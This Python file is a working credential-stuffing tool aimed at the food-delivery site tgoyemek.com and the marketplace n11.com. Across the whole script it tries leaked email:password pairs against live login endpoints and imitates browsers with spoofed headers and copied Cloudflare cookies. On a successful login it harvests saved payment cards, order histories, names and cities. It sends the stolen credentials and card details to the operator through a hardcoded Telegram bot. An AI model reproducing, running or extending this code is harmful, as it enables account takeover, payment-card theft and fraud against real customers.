import requests
import time
import re
import threading
import html
import json
import random
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init

init(autoreset=True)

# -----------------------------
# AYARLAR
# -----------------------------
BASE_URL = "https://tgoyemek.com"
CSRF_URL = f"{BASE_URL}/api/auth/csrf"
LOGIN_URL = f"{BASE_URL}/api/auth/login"
CARDS_URL = f"{BASE_URL}/hesabim/kayitli-kartlarim"

THREAD_COUNT = 30
MAX_PROXY_RETRY = 5
DELAY_PER_ACCOUNT = 0.3
CSRF_REFRESH_EVERY = 1

# 3 saniyede 1 istek
REQUEST_INTERVAL = 3.0

# N11 AYARLAR
N11_BASE_URL    = "https://www.n11.com"
N11_CSRF_URL    = f"{N11_BASE_URL}/giris-yap"
N11_LOGIN_URL   = f"{N11_BASE_URL}/login"
N11_ORDERS_URL  = f"{N11_BASE_URL}/rest/v1/getProductOrderLightList?listingType=ALL&dateFormat=&pg=1"
N11_POINT_URL   = f"{N11_BASE_URL}/rest/v1/pointBalanceText"
N11_FORGERY_URL = f"{N11_BASE_URL}/api/forgery-token"

N11_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/145.0.0.0 Safari/537.36"
)

TG_TOKEN = "8849504334:AAFdhT7VqkoWr_NXyVUvv61BkligwbgSKFw"
TG_CHAT_ID = "8295696730"
TG_API = f"https://api.telegram.org/bot{TG_TOKEN}"


# -----------------------------
# DURUM
# -----------------------------
STATS = {
    "total": 0, "checked": 0, "hits": 0, "fails": 0, "errors": 0,
    "bad": 0, "phone": 0, "cards_found": 0,
    "start_time": None, "running": False,
    "last_hit": "-", "last_card": "-",
    "csrf_count": 0,
    "retried": 0,
    "n11_checked": 0, "n11_hits": 0, "n11_bad": 0,
    "n11_susp": 0, "n11_locked": 0, "n11_err": 0,
    "n11_cards": 0, "n11_orders_total": 0,
    "active_checker": "-",
}
STATS_LOCK = threading.Lock()
CSRF_REFRESH_FLAG = threading.Event()
DASH_MSG_ID = None
STOP_EVENT = threading.Event()

# HAFIZA (RAM) - Diske hiçbir şey yazılmıyor
MEMORY_HITS = []
MEMORY_CARDS = []
MEMORY_N11_HITS = []
MEMORY_N11_SUSP = []
MEMORY_PHONE = []
MEMORY_LOCK = threading.Lock()


class LoginResult:
    HIT = "hit"
    WRONG = "wrong"
    PHONE = "phone"
    BAD_REQ = "bad_req"
    ERROR = "error"


INITIAL_COOKIES = {
    "tgo-ref": "getir",
    "tgo-lang": "tr",
    "guest-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cm46dHJlbmR5b2w6YW5vbmlkIjoiZDAyMTczMDZiODVjMTFmMWI5OTYwMjcxY2UzZmZjOTciLCJyb2xlIjoiYW5vbiIsImF0d3J0bWsiOiJkMDIxNzMwMy1iODVjLTExZjEtYjk5Ni0wMjcxY2UzZmZjOTciLCJhcHBOYW1lIjoibGMiLCJhdWQiOiJMTjNFUzY1bkZtOHp6UUliZ3YwUWdPRTNIV2lZOGFQUSIsImV4cCI6MTk0ODA3MjQxOSwiaXNzIjoiYXV0aC50cmVuZHlvbC5jb20iLCJuYmYiOjE3OTAyODQ0MTl9.KlmTHt-S65HpvOO-1uOK3zj5vXgAkimrMUHnWSwdB28",
    "tgo-pid": "7db11c26-5330-4ed5-9ee0-272cf33d62b1",
    "tgo-sid": "df4ada1a-cc62-4169-a970-164ee223552d",
    "__cflb": "0H28v7gD3Wo4WqgNdcHK9qGKSowYfmoJDnyBUAQVDrM",
    "cf_clearance": "LC9fSMJ8.kskFhava5hfnGmA.7GU1lUToBB7AtJBf2U-1790284420-1.2.1.1-_MO4sjAKaSFxp74IsXUa_4yXsFpiThyy5HWHwXq94ABNE5f.7pyZae1wuZ2FmQrxdmqaCmPIFuj4QMgbByar7QHyYaCM95oOYzqUeCgIIEnWj_Z1x8S38mvMOk7rI9mMLgtWNCiZ529b2rHvoW7iUegohP2gUAh3rktxaHp_DJbOQ5s4e7.r0O2mw1eb0e.jJlwr2ZOopoT6S4CNhqGWtHp9OhM0JAs6uVlysnfSWa8i6u5AWNEI7ZTUgiOFcXZfbDk_PoWVseRpwv9kjQq_BuzRapYHzmXWArKQOVI490O.Y_xDrcNMjZzrFwi0F_IabN0geN2FNpiqi.mGfZcJnCBbWfgta3pk5y94.h.Izow",
    "__cf_bm": "kZdT51w4y4MIYJrEk.BBHqme9hTcey3mHwAlnCgjz0g-1790284420.3545141-1.0.1.1-.6kMcf5QWDzMeCrdqDG5as3fvn7MxNOJAHS28OWJIo8.IPvxvRqnpFcVndsbsTyj34fJDefsvqNjGVojxJdas7Aaebyke3W2zCGc_ROy9y53mdEDF4U0WSj5atLcVanH",
    "_cfuvid": "._dX7734figdM9Lobm7koWtnFjIZmOqbViBl0Gu5L7U-1790284439.1201816-1.0.1.1-4MQFd1vF9OD_o1OATA7GEinEVQY5c3f5FhiEfJDAqTY",
}


# -----------------------------
# GLOBAL RATE LIMITER (3sn/istek)
# -----------------------------
class GlobalRateLimiter:
    def __init__(self, interval: float = 3.0):
        self._interval = interval
        self._lock = threading.Lock()
        self._next_slot = time.monotonic()

    def acquire(self, timeout: float = 120.0) -> bool:
        deadline = time.monotonic() + timeout
        with self._lock:
            now = time.monotonic()
            slot = max(now, self._next_slot)
            if slot > deadline:
                return False
            self._next_slot = slot + self._interval
            wait = slot - now
        if wait > 0:
            time.sleep(wait)
        return True


RATE_LIMITER = GlobalRateLimiter(interval=REQUEST_INTERVAL)


# -----------------------------
# TELEGRAM
# -----------------------------
def tg(method, **kwargs):
    try:
        r = requests.post(f"{TG_API}/{method}", data=kwargs, timeout=15)
        return r.json()
    except Exception:
        return None


def tg_send(text, parse_mode="HTML", reply_markup=None):
    kwargs = {"chat_id": TG_CHAT_ID, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        kwargs["reply_markup"] = json.dumps(reply_markup)
    return tg("sendMessage", **kwargs)


def tg_edit(message_id, text, parse_mode="HTML", reply_markup=None):
    kwargs = {"chat_id": TG_CHAT_ID, "message_id": message_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        kwargs["reply_markup"] = json.dumps(reply_markup)
    return tg("editMessageText", **kwargs)


def dashboard_buttons():
    return {"inline_keyboard": [
        [{"text": "🔄 CSRF Yenile", "callback_data": "refresh_csrf"},
         {"text": "📊 Durum", "callback_data": "status"}],
        [{"text": "💳 Kartlar", "callback_data": "show_cards"},
         {"text": "🎯 Hit", "callback_data": "show_hits"}],
        [{"text": "📞 Telefon", "callback_data": "show_phone"}],
        [{"text": "🛒 N11 Hit", "callback_data": "n11_show_hits"},
         {"text": "⚠️ N11 Askı", "callback_data": "n11_show_susp"}],
    ]}


def tg_hit_alert(email, password, idx, cards=None):
    card_block = ""
    if cards:
        lines = []
        for c in cards:
            lines.append(
                f"  • <b>{html.escape(c.get('name','-'))}</b> — "
                f"<code>{html.escape(c.get('maskedCardNumber','-'))}</code> "
                f"({html.escape(c.get('bankName','-'))})"
            )
        card_block = "\n💳 <b>Kartlar:</b>\n" + "\n".join(lines)
    tg_send(
        f"🎯 <b>HIT #{idx}</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📧 <code>{html.escape(email)}</code>\n"
        f"🔑 <code>{html.escape(password)}</code>\n"
        f"🌐 {BASE_URL}{card_block}\n"
        f"🕐 {datetime.now().strftime('%H:%M:%S')}"
    )


# -----------------------------
# CANLI TABLO
# -----------------------------
def build_dashboard():
    with STATS_LOCK:
        elapsed = time.time() - STATS["start_time"] if STATS["start_time"] else 0
        mins, secs = divmod(int(elapsed), 60)
        speed = STATS["checked"] / elapsed if elapsed > 0 else 0
        remaining = STATS["total"] - STATS["checked"]
        eta = remaining / speed if speed > 0 else 0
        eta_m, eta_s = divmod(int(eta), 60)

        return (
            f"📊 <b>CANLI TABLO</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🎯 Aktif: <b>{STATS.get('active_checker','-')}</b>\n"
            f"📦 Toplam: <b>{STATS['total']}</b>\n"
            f"✅ Kontrol: <b>{STATS['checked']}</b>\n"
            f"🎯 Hit: <b>{STATS['hits']}</b>\n"
            f"💳 Kart: <b>{STATS['cards_found']}</b>\n"
            f"📞 Telefon: <b>{STATS['phone']}</b>\n"
            f"❌ Yanlış: <b>{STATS['bad']}</b>\n"
            f"⚠️ Diğer: <b>{STATS['fails'] + STATS['errors']}</b>\n"
            f"🔁 Retry: <b>{STATS['retried']}</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"⚡ Hız: <b>{speed:.2f}</b> h/s\n"
            f"⏱ Süre: <b>{mins}d {secs}s</b>\n"
            f"⏳ ETA: <b>{eta_m}d {eta_s}s</b>\n"
            f"🔄 CSRF: <b>{STATS['csrf_count']}</b>\n"
            f"📡 Mod: <b>DIRECT (3sn/istek)</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🛒 <b>N11</b> — Hit: <b>{STATS.get('n11_hits',0)}</b> · "
            f"Bad: <b>{STATS.get('n11_bad',0)}</b> · "
            f"Askı: <b>{STATS.get('n11_susp',0)}</b> · "
            f"Kart: <b>{STATS.get('n11_cards',0)}</b> · "
            f"Sip: <b>{STATS.get('n11_orders_total',0)}</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🕐 Son Hit: <b>{STATS['last_hit']}</b>\n"
            f"💳 Son Kart: <b>{STATS['last_card']}</b>\n"
            f"📡 Durum: <b>{'ÇALIŞIYOR' if STATS['running'] else 'DURDU'}</b>"
        )


def dashboard_updater():
    global DASH_MSG_ID
    last_text = None
    while not STOP_EVENT.is_set():
        text = build_dashboard()
        if text != last_text:
            if DASH_MSG_ID is None:
                res = tg_send(text, reply_markup=dashboard_buttons())
                if res and res.get("ok"):
                    DASH_MSG_ID = res["result"]["message_id"]
            else:
                tg_edit(DASH_MSG_ID, text, reply_markup=dashboard_buttons())
            last_text = text
        time.sleep(2)


# -----------------------------
# CALLBACK LISTENER
# -----------------------------
def callback_listener():
    last_update_id = 0
    while not STOP_EVENT.is_set():
        res = tg("getUpdates", offset=last_update_id + 1, timeout=5)
        if not res or not res.get("ok"):
            time.sleep(2)
            continue
        for upd in res["result"]:
            last_update_id = upd["update_id"]
            cb = upd.get("callback_query")
            if not cb:
                continue
            data = cb.get("data", "")
            tg("answerCallbackQuery", callback_query_id=cb["id"], text="✅")

            if data == "refresh_csrf":
                CSRF_REFRESH_FLAG.set()
                tg_send("🔄 CSRF yenileme kuyruğa alındı.")
            elif data == "status":
                tg_send(build_dashboard())
            elif data == "show_cards":
                with MEMORY_LOCK:
                    cards = list(MEMORY_CARDS)
                if cards:
                    lines = [f"💳 <b>Toplam {len(cards)} kart</b>\n"]
                    for i, (em, c) in enumerate(cards[-30:], 1):
                        lines.append(
                            f"{i}. <b>{html.escape(c.get('name','-'))}</b> — "
                            f"<code>{html.escape(c.get('maskedCardNumber','-'))}</code> "
                            f"<i>({html.escape(em)})</i>"
                        )
                    tg_send("\n".join(lines))
                else:
                    tg_send("💳 Kart yok.")
            elif data == "show_hits":
                with MEMORY_LOCK:
                    hits = list(MEMORY_HITS)
                if hits:
                    lines = ["🎯 <b>Hit Listesi</b>\n"]
                    for i, h in enumerate(hits[-30:], 1):
                        lines.append(f"{i}. <code>{html.escape(h)}</code>")
                    tg_send("\n".join(lines))
                else:
                    tg_send("Hit yok.")
            elif data == "show_phone":
                with MEMORY_LOCK:
                    phones = list(MEMORY_PHONE)
                if phones:
                    lines = ["📞 <b>Telefon Bekleyenler</b>\n"]
                    for i, p in enumerate(phones[-30:], 1):
                        lines.append(f"{i}. <code>{html.escape(p)}</code>")
                    tg_send("\n".join(lines))
                else:
                    tg_send("Telefon bekleyen yok.")
            elif data == "n11_show_hits":
                with MEMORY_LOCK:
                    nhits = list(MEMORY_N11_HITS)
                if nhits:
                    out = ["🛒 <b>N11 Hit Listesi</b>\n"]
                    for i, h in enumerate(nhits[-30:], 1):
                        out.append(f"{i}. <code>{html.escape(h)}</code>")
                    tg_send("\n".join(out))
                else:
                    tg_send("N11 hit yok.")
            elif data == "n11_show_susp":
                with MEMORY_LOCK:
                    nsusp = list(MEMORY_N11_SUSP)
                if nsusp:
                    out = ["⚠️ <b>N11 Askıdakiler</b>\n"]
                    for i, h in enumerate(nsusp[-30:], 1):
                        out.append(f"{i}. <code>{html.escape(h)}</code>")
                    tg_send("\n".join(out))
                else:
                    tg_send("N11 askıda yok.")
        time.sleep(1)


# -----------------------------
# CSRF MANAGER
# -----------------------------
class CSRFManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.counter = 0
        self.token = None

    def should_refresh(self):
        with self.lock:
            if CSRF_REFRESH_FLAG.is_set():
                CSRF_REFRESH_FLAG.clear()
                return True
            return self.counter >= CSRF_REFRESH_EVERY or self.token is None

    def tick(self):
        with self.lock:
            self.counter += 1

    def reset(self, token):
        with self.lock:
            self.counter = 0
            self.token = token
            with STATS_LOCK:
                STATS["csrf_count"] += 1


CSRF_MGR = CSRFManager()


# -----------------------------
# YARDIMCI
# -----------------------------
def build_headers(csrf_token=None, cookies=None, extra=None):
    cookie_str = "; ".join(f"{k}={v}" for k, v in (cookies or {}).items())
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
        "dnt": "1",
        "sec-ch-ua-mobile": "?1",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": f"{BASE_URL}/giris?callbackUrl=%2Frestoranlar",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "priority": "u=1, i",
        "Cookie": cookie_str,
    }
    if csrf_token:
        headers["content-type"] = "text/plain;charset=UTF-8"
        headers["origin"] = BASE_URL
    if extra:
        headers.update(extra)
    return headers


def fetch_csrf(session):
    r = session.get(
        CSRF_URL,
        headers=build_headers(cookies=session.cookies.get_dict()),
        timeout=15,
    )
    csrf_cookie = session.cookies.get("tgo-csrf-token")
    body_token = None
    try:
        data = r.json()
        body_token = data.get("csrfToken") or data.get("token")
    except Exception:
        m = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', r.text)
        if m:
            body_token = m.group(1)
    token = body_token or csrf_cookie
    if token:
        CSRF_MGR.reset(token)
    return token


def classify_login(response):
    status = response.status_code
    text = response.text
    low = text.lower()

    if "tgo-token" in [c.name for c in response.cookies]:
        return LoginResult.HIT
    m = re.search(r'"token"\s*:\s*"([^"]+)"', text)
    if m and len(m.group(1)) > 30:
        return LoginResult.HIT
    m = re.search(r'"access_token"\s*:\s*"([^"]+)"', text)
    if m and len(m.group(1)) > 30:
        return LoginResult.HIT

    if "telefonunuza" in low or ("telefon" in low and "doğrula" in low):
        return LoginResult.PHONE
    if "phone" in low and ("verify" in low or "verification" in low):
        return LoginResult.PHONE

    if "hatalı" in low and ("şifre" in low or "e-posta" in low or "eposta" in low):
        return LoginResult.WRONG
    if "invalid credentials" in low or "wrong password" in low:
        return LoginResult.WRONG

    if status == 400 and "bad request" in low:
        return LoginResult.BAD_REQ

    if "beklenmeyen" in low or "error occurred" in low:
        return LoginResult.ERROR

    if status == 200:
        return LoginResult.HIT

    return LoginResult.ERROR


def try_login(session, email, password, csrf_token):
    payload = '{"username":"%s","password":"%s","csrfToken":"%s"}' % (email, password, csrf_token)
    r = session.post(
        LOGIN_URL,
        data=payload,
        headers=build_headers(csrf_token=csrf_token, cookies=session.cookies.get_dict()),
        timeout=15,
        allow_redirects=False,
    )
    return classify_login(r), r


def extract_token_from_response(response):
    token = response.cookies.get("tgo-token")
    if not token:
        for c in response.cookies:
            if c.name == "tgo-token":
                token = c.value
                break
    if token:
        return token
    m = re.search(r'"token"\s*:\s*"([^"]+)"', response.text)
    if m and len(m.group(1)) > 30:
        return m.group(1)
    m = re.search(r'"access_token"\s*:\s*"([^"]+)"', response.text)
    if m and len(m.group(1)) > 30:
        return m.group(1)
    return None


def fetch_cards(session, token):
    try:
        extra_headers = {
            "rsc": "1",
            "next-router-state-tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22(tgo)%22%2C%7B%22children%22%3A%5B%22(instant)%22%2C%7B%22children%22%3A%5B%22(main)%22%2C%7B%22children%22%3A%5B%22my-account%22%2C%7B%22children%22%3A%5B%22saved-cards%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
            "next-url": "/my-account/saved-cards",
            "referer": f"{BASE_URL}/hesabim/kayitli-kartlarim",
        }
        cookies = session.cookies.get_dict()
        cookies["tgo-token"] = token
        r = session.get(
            CARDS_URL,
            params={"_rsc": "tj3q5CFih8kMWE5e"},
            headers=build_headers(cookies=cookies, extra=extra_headers),
            timeout=15,
        )
        return parse_cards(r.text)
    except Exception:
        return []


def parse_cards(text):
    cards = []
    pattern = re.compile(r'\{"cardId":(\d+).*?\}', re.DOTALL)
    for m in pattern.finditer(text):
        block = m.group(0)
        if '"maskedCardNumber"' not in block:
            continue
        card = {}
        for field in ["cardId", "name", "maskedCardNumber", "cardType", "cardTypeName",
                      "cardSourceType", "bankName", "bankLogoUrl", "cardYear", "cardMonth",
                      "cardCountry", "cardCountryIsoA2", "cardNetwork"]:
            fm = re.search(rf'"{field}":"([^"]*)"', block)
            if fm:
                card[field] = fm.group(1)
            else:
                fm = re.search(rf'"{field}":(\d+)', block)
                if fm:
                    card[field] = fm.group(1)
        for field in ["isDebitCard", "cvvRequired", "isRewardable", "isCoBranded", "isPayLater", "preAuthCompatible"]:
            fm = re.search(rf'"{field}":(true|false)', block)
            if fm:
                card[field] = fm.group(1) == "true"
        if card.get("maskedCardNumber"):
            cards.append(card)
    return cards


# -----------------------------
# N11
# -----------------------------
def n11_generate_csrf():
    import base64
    ts = int(time.time() * 1000)
    rand = round(random.uniform(0.1, 0.9999), 4)
    raw = f"{ts}.{rand}"
    return base64.b64encode(raw.encode()).decode().rstrip("=")


def n11_get_session():
    base_headers = {
        "User-Agent": N11_UA,
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    session = requests.Session()
    session.headers.update(base_headers)
    try:
        r = session.get(
            N11_CSRF_URL,
            headers={
                **base_headers,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": f"{N11_BASE_URL}/",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
            },
            timeout=12,
            allow_redirects=True,
        )
        html_body = r.text or ""
        csrf = ""
        for pat in (
            r'"_csrf"\s*:\s*"([A-Za-z0-9+/=]{10,})"',
            r"'_csrf'\s*:\s*'([A-Za-z0-9+/=]{10,})'",
            r'name="_csrf"\s+value="([^"]+)"',
        ):
            m = re.search(pat, html_body)
            if m:
                csrf = m.group(1)
                break
        if not csrf:
            csrf = n11_generate_csrf()

        forgery = ""
        try:
            fr = session.get(
                N11_FORGERY_URL,
                headers={
                    **base_headers,
                    "Accept": "application/json, text/plain, */*",
                    "Referer": N11_CSRF_URL,
                    "ADRUM": "isAjax:true",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-origin",
                },
                timeout=6,
            )
            if fr.status_code == 200:
                try:
                    data = fr.json()
                    forgery = (
                        data.get("forgeryToken")
                        or data.get("_forgeryToken")
                        or data.get("token")
                        or ""
                    )
                except Exception:
                    m = re.search(
                        r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
                        fr.text, re.I,
                    )
                    if m:
                        forgery = m.group(0)
        except Exception:
            pass

        if not forgery:
            for pat in (
                r'"_forgeryToken"\s*:\s*"([0-9a-f\-]{30,})"',
                r'forgeryToken["\s:=]+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})',
            ):
                m = re.search(pat, html_body, re.I)
                if m:
                    forgery = m.group(1)
                    break
        if not forgery:
            forgery = str(uuid.uuid4())

        ts_ms = int(time.time() * 1000)
        device_id = f"1M{ts_ms}.{random.randint(1000000000, 9999999999)}"
        return {
            "session": session,
            "csrf": csrf,
            "forgery": forgery,
            "device_id": device_id,
        }
    except requests.exceptions.RequestException:
        return None


def n11_get_orders(session):
    try:
        headers = {
            "ADRUM": "isAjax:true",
            "Accept": "application/json, text/plain, */*",
            "Referer": f"{N11_BASE_URL}/hesabim/siparislerim",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": N11_UA,
        }
        r = session.get(N11_ORDERS_URL, headers=headers, timeout=10)
        if r.status_code != 200:
            return [], 0
        data = r.json()
        orders = data.get("orders", []) or []
        pagination = data.get("pagination", {}) or {}
        total_count = int(pagination.get("totalCount") or len(orders) or 0)
        return orders, (total_count if total_count else len(orders))
    except Exception:
        return [], 0


def n11_check_saved_card(session):
    try:
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Length": "0",
            "Origin": N11_BASE_URL,
            "Referer": f"{N11_BASE_URL}/hesabim/odeme-seceneklerim",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": N11_UA,
        }
        r = session.post(N11_POINT_URL, headers=headers, timeout=6)
        if r.status_code == 200:
            data = r.json()
            campaigns = data.get("campaigns", []) or []
            for k in campaigns:
                if k.get("type") == "CARD_SAVE":
                    return False
            return True
    except Exception:
        pass
    return None


def n11_check_account(email, password):
    sess_data = n11_get_session()
    if not sess_data:
        return "ERROR", None, None, None, None

    session = sess_data["session"]
    ts_p = int(time.time() * 1000)
    url = f"{N11_LOGIN_URL}?{ts_p}"
    headers = {
        "ADRUM": "isAjax:true",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": N11_BASE_URL,
        "Referer": N11_CSRF_URL,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": N11_UA,
        "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    payload = {
        "email": email,
        "password": password,
        "_csrf": sess_data["csrf"],
        "_forgeryToken": sess_data["forgery"],
        "_deviceId": sess_data["device_id"],
        "setEncoding": True,
    }
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=12,
                            allow_redirects=True)
        try:
            body = resp.json()
        except Exception:
            body = {}

        inner = body.get("data", {}) if isinstance(body.get("data"), dict) else body
        error_type = inner.get("errorType", "") if isinstance(inner, dict) else ""
        server_fp = inner.get("fingerPrint", "") if isinstance(inner, dict) else ""

        if error_type == "INVALID_FORGERY_TOKEN" and server_fp:
            payload["_forgeryToken"] = server_fp
            url2 = f"{N11_LOGIN_URL}?{int(time.time() * 1000)}"
            resp = session.post(url2, headers=headers, json=payload, timeout=12,
                                allow_redirects=True)
            try:
                body = resp.json()
            except Exception:
                body = {}
            inner = body.get("data", {}) if isinstance(body.get("data"), dict) else body
            error_type = inner.get("errorType", "") if isinstance(inner, dict) else ""

        status_code = resp.status_code
        text_lower = (resp.text or "").lower()
        CLEAN_BAD = {
            "INVALID_CREDENTIALS", "INVALID_USER_CREDENTIALS",
            "WRONG_PASSWORD", "USER_NOT_FOUND",
        }
        SUSPENDED = {
            "BUYER_IS_TEMPORARILY_SUSPENDED", "BUYER_IS_PERMANENTLY_SUSPENDED",
            "ACCOUNT_SUSPENDED", "TEMPORARILY_SUSPENDED", "PERMANENTLY_SUSPENDED",
        }
        captcha_signals = [
            "captcha" in text_lower,
            "robot" in text_lower,
            resp.headers.get("cf-mitigated", "") != "",
            status_code == 403,
            error_type == "CAPTCHA_REQUIRED",
        ]
        blr = body.get("buyerLoginResponse") or {}
        has_buyer_data = bool(
            blr.get("buyerId") or blr.get("buyerEmail") or blr.get("accessToken")
            or blr.get("buyerFirstName") or blr.get("buyerLastName")
        )
        redirect_url = body.get("redirectUrl") or ""
        success_signals = [
            has_buyer_data,
            body.get("success") is True,
            bool(redirect_url) and redirect_url not in ("", "null", None),
            "hesabim" in (resp.url or ""),
            "hesabim" in str(redirect_url),
            "dashboard" in (resp.url or ""),
            error_type == "SUCCESS",
            (bool(redirect_url) and error_type == ""),
        ]
        if any(success_signals):
            orders, order_count = n11_get_orders(session)
            if order_count == 0 or not orders:
                return "BAD", None, None, None, None
            card_status = n11_check_saved_card(session)
            return "HIT", body, orders, order_count, card_status
        if any(captcha_signals):
            return "CAPTCHA", None, None, None, None
        if error_type in CLEAN_BAD:
            return "BAD", None, None, None, None
        if error_type in SUSPENDED:
            return "SUSPENDED", body, None, None, None
        if error_type == "ACCOUNT_LOCKED":
            return "LOCKED", body, None, None, None
        if body.get("success") is False or status_code == 401:
            return "BAD", None, None, None, None
        return "ERROR", body, None, None, None
    except requests.exceptions.Timeout:
        return "TIMEOUT", None, None, None, None
    except requests.exceptions.ConnectionError:
        return "ERROR", None, None, None, None
    except Exception:
        return "ERROR", None, None, None, None


def _n11_get(dict_key_pairs):
    for d, keys in dict_key_pairs:
        if not isinstance(d, dict):
            continue
        for k in keys if isinstance(keys, list) else [keys]:
            v = d.get(k)
            if v not in [None, "", "null", "N/A", 0, False]:
                return str(v)
    return "N/A"


def _n11_calc_total_value(orders):
    total = 0.0
    for o in orders or []:
        s = str(o.get("totalAmount", "0") or "0")
        s = re.sub(r"[^\d,\.]", "", s).replace(",", ".")
        try:
            total += float(s)
        except Exception:
            pass
    return total


def n11_format_hit(email, password, body, orders, order_count, card_status):
    blr = (body or {}).get("buyerLoginResponse", {}) or {}
    addr = blr.get("selectedAddress", {}) or {}
    fn = _n11_get([(blr, ["buyerFirstName", "firstName", "name", "buyerName"])])
    ln = _n11_get([(blr, ["buyerLastName", "lastName", "surname", "buyerSurname"])])
    name = f"{fn} {ln}".replace("N/A", "").strip() or "N/A"
    city = _n11_get([(addr, ["cityName", "city", "province", "il"])])
    total_val = _n11_calc_total_value(orders)
    if card_status is True:
        card_text = "Kart Var"
    elif card_status is False:
        card_text = "Kart Yok"
    else:
        card_text = "?"
    short = (
        f"{email}:{password} | {name} | {city} | "
        f"Sipariş:{order_count} | {total_val:.2f}TL | {card_text}"
    )
    return short, short


# -----------------------------
# TGOYEMEK — TEK HESAP (RAM'e yazar)
# -----------------------------
def try_account(email, password):
    attempt = 0
    while not STOP_EVENT.is_set():
        attempt += 1
        try:
            if not RATE_LIMITER.acquire():
                continue

            session = requests.Session()
            session.cookies.update(INITIAL_COOKIES)

            if CSRF_MGR.should_refresh():
                csrf = fetch_csrf(session)
            else:
                csrf = CSRF_MGR.token

            if not csrf:
                with STATS_LOCK:
                    STATS["retried"] += 1
                continue

            if not RATE_LIMITER.acquire():
                continue
            result, resp = try_login(session, email, password, csrf)
            CSRF_MGR.tick()

            if result == LoginResult.HIT:
                with STATS_LOCK:
                    STATS["checked"] += 1
                    STATS["hits"] += 1
                    STATS["last_hit"] = f"{email} @ {datetime.now().strftime('%H:%M:%S')}"

                token = extract_token_from_response(resp)
                cards = []
                if token:
                    if RATE_LIMITER.acquire():
                        cards = fetch_cards(session, token)
                    if cards:
                        with MEMORY_LOCK:
                            for c in cards:
                                MEMORY_CARDS.append((email, c))
                        with STATS_LOCK:
                            STATS["cards_found"] += len(cards)
                            STATS["last_card"] = f"{cards[0].get('name','?')} — {cards[0].get('maskedCardNumber','?')}"

                with MEMORY_LOCK:
                    MEMORY_HITS.append(f"{email}:{password}")

                print(Fore.GREEN + f"[+] HIT: {email}:{password} | Kart: {len(cards)} | Deneme: {attempt}")
                tg_hit_alert(email, password, STATS["hits"], cards)
                return

            if result == LoginResult.WRONG:
                with STATS_LOCK:
                    STATS["checked"] += 1
                    STATS["bad"] += 1
                print(Fore.RED + f"[-] YANLIŞ: {email} | Deneme: {attempt}")
                return

            if result == LoginResult.PHONE:
                with STATS_LOCK:
                    STATS["retried"] += 1
                    STATS["phone"] += 1
                with MEMORY_LOCK:
                    MEMORY_PHONE.append(f"{email}:{password}")
                print(Fore.CYAN + f"[📞] TELEFON: {email} | Deneme: {attempt}")
                return

            if result == LoginResult.BAD_REQ:
                with STATS_LOCK:
                    STATS["retried"] += 1
                print(Fore.YELLOW + f"[-] BAD REQ (retry): {email} | Deneme: {attempt}")
                continue

            with STATS_LOCK:
                STATS["retried"] += 1
            print(Fore.YELLOW + f"[!] ERROR (retry): {email} | Deneme: {attempt}")

        except Exception as e:
            print(Fore.YELLOW + f"[!] {email} -> {e}")
            with STATS_LOCK:
                STATS["retried"] += 1

